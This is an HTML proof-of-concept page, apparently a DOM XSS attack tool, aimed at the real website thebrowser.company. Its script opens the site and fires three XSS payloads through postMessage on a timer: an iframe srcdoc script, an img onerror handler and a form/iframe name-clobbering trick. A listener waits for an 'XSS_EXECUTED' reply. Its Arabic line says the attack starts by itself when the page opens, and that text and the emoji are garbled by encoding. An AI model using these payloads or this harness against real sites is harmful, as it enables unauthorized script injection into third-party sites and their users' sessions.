<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>XSS Test on thebrowser.company</title>
</head>
<body>
  <h2>ğŸš¨ DOM XSS PoC â€“ thebrowser.company</h2>
  <p>Ø§Ù„Ù‡Ø¬ÙˆÙ… ÙŠØ¨Ø¯Ø£ ØªÙ„Ù‚Ø§Ø¦ÙŠÙ‹Ø§ Ø¨Ù…Ø¬Ø±Ø¯ ÙØªØ­ Ø§Ù„ØµÙØ­Ø©</p>

  <script>
    const target = window.open("https://thebrowser.company/", "_blank");

    const payloads = [
      {
        desc: "iframe + postMessage",
        html: `<iframe srcdoc='<script>parent.postMessage("XSS_EXECUTED","*")</script>'></iframe>`
      },
      {
        desc: "img onerror + postMessage",
        html: `<img src=x onerror="parent.postMessage('XSS_EXECUTED','*')">`
      },
      {
        desc: "form + iframe name clobbering",
        html: `<form><input name=parent><iframe name=parent onload="parent.postMessage('XSS_EXECUTED','*')"></iframe></form>`
      }
    ];

    let i = 0;

    function sendPayload() {
      if (i >= payloads.length) return;
      const p = payloads[i];
      console.log(`ğŸš€ Testing payload: ${p.desc}`);
      try {
        target.postMessage({ type: "inject", html: p.html }, "*");
      } catch (e) {
        console.error("âŒ postMessage failed", e);
      }
      i++;
      setTimeout(sendPayload, 3000);
    }

    setTimeout(sendPayload, 3000);

    window.addEventListener("message", (e) => {
      if (e.data === "XSS_EXECUTED") {
        alert("âœ… XSS EXECUTED");
        console.log("âœ… Payload executed:", e);
      } else {
        console.log("ğŸ“© Received message:", e.data);
      }
    });
  </script>
</body>
</html>
